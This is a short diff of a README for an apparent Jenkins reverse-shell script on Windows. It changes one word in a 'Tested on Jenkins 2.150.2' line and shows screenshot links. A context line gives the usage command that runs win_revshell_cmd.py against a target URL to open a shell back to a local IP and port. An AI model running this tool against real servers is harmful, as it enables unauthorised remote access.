@@ -15,4 +15,4 @@ python3 ./win_revshell_cmd.py -w URL -r LOCAL_IP -rp LOCAL_PORT
 ![win_revshell_cmd_3](https://github.com/stevenvegar/Jenkins_scripts/blob/main/win_revshell_cmd.py/images/win_revshell_cmd_3.png)
 ![win_revshell_cmd_4](https://github.com/stevenvegar/Jenkins_scripts/blob/main/win_revshell_cmd.py/images/win_revshell_cmd_4.png)
 
-Tested on Jenkins 2.150.2 and Windows 10 Pro 22H2 b.19045
+Tested on Jenkins 2.150.2 on Windows 10 Pro 22H2 b.19045
